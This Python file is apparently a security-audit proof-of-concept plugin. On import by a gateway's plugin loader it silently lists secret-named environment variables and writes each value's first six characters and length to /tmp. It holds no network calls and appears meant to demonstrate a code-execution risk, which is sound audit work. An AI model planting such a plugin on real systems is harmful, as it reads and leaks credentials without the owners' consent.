"""Security audit PoC plugin v2 (masked env inventory).

If imported by the hermes gateway plugin loader, writes a MASKED inventory
of secret-looking environment variables (name + first 6 chars + length)
to /tmp/hermes_audit_poc_env.txt. No full values, no network calls.
"""

from os import environ
from pathlib import Path

_OUT = Path("/tmp/hermes_audit_poc_env.txt")
_MARKERS = ("KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "DSN", "WEBHOOK")

try:
    lines = ["# hermes audit poc — masked env inventory (loaded in-process)"]
    for name in sorted(environ):
        val = environ[name]
        if any(m in name.upper() for m in _MARKERS):
            masked = (val[:6] + "..." + f"(len={len(val)})") if val else "(empty)"
            lines.append(f"{name} = {masked}")
        else:
            lines.append(f"{name} : (non-secret, len={len(val)})")
    _OUT.write_text("\n".join(lines) + "\n")
    (Path("/tmp/hermes_audit_poc_plugin_loaded")).write_text("v2 loaded\n")
except Exception:
    pass
